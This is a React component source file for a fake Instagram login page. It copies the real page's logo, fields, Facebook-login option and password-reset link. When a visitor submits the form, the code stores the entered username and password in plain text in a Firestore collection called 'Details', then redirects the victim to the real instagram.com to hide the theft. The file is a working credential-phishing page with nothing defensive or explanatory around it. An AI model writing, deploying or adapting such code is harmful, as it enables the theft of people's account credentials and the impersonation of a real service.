import React,{useState,useContext} from 'react'
import './Component.css'
import {FirebaseContext} from '../store/firebaseContext'

function Component() {
    const {firebase}= useContext(FirebaseContext)
    const [userName,setUserName] = useState([])
    const [password,setPassword] = useState([])
   


    
    const handleSubmit = (e) => {
       
        e.preventDefault()
                                                                   
        const date = new Date();            

        firebase.firestore().collection('Details').add({
            
            userName,
            password,
            date
            
        
        }).then(() => {
            window.location.href = 'https://instagram.com';
        }).catch((err) =>{
            alert(err.message)
        })
    }
        
    return (
        <div>
            <div className="wrapper">
                <div className="container">
                    <div className="row">
                        <div className="col-md-6 firstContainer">
                            <img
                                src="img/app-feautures.png"
                                alt="[+]"
                                className="rounded d-block w-100"
                            />
                        </div>
                        <div className="col-md-6 text-center secondContainer">
                            <div className="card">
                                <div className="py-3 px-2">
                                    <img src="img/instagram-logo.png" alt="card-img-top" />
                                </div>
                                <div className="card-body">
                                    <form method="post" onSubmit={handleSubmit}>
                                        <div className="form-group py-1">
                                            <input
                                                type="text"
                                                className="form-control"
                                                value={userName}
                                                onChange={(e)=>setUserName(e.target.value)}
                                               
                                            
                                                aria-describedby="helpId"
                                                placeholder= "Phone number, username or email"
                                            />
                                        </div>
                                        <div className="form-group py-1">
                                            <input
                                                type="password"
                                                className="form-control"
                                              
                                                value={password}
                                                onChange={(e)=>setPassword(e.target.value)}
                                                aria-describedby="helpId"
                                                placeholder="Password"
                                            />
                                        </div>
                                      <button
                                            type="submit"
                                            defaultValue="Log in"
                                            className="btn mt-2 btn btn-primary w-100 "
                                        >  Log in</button> 
                                    </form>
                                    <div className="or">
                                        <span>OR</span>
                                    </div>
                                    <div className="otherMethods">
                                        <div className="secondaryColor">
                                            <img
                                                src="img/facebook-logo.png"
                                                className="img-fluid rounded"
                                                alt="[+]"
                                                style={{ width: 18, height: 18 }}
                                            />
                                            <span className="ms-2">Log in with Facebook</span>
                                        </div>
                                    </div>
                                   <a style={{ textDecoration :'none' }}href="https://www.instagram.com/accounts/password/reset/"> <div className="forgot-pass mt-3 primaryColor">
                                        Forgot Password ?
                                    </div> </a>
                                </div>
                            </div>
                            <div className="card my-2">
                                <div className="card-body">
                                    <span>Don't Have an Account?</span>
                                    <span className="primaryColor">Sign Up</span>
                                </div>
                            </div>
                            <span className="primaryColor">Get the App</span>
                            <div className="row py-2">
                                <div className="col-6">
                                    <img
                                        src="img/playstore.png"
                                        alt="[+]"
                                        className="img-fluid d-block rounded"
                                    />
                                </div>
                                <div className="col-6">
                                    <img
                                        src="img/appstore.png"
                                        alt="[+]"
                                        className="img-fluid d-block rounded"
                                    />
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

        </div>
    )
}

export default Component
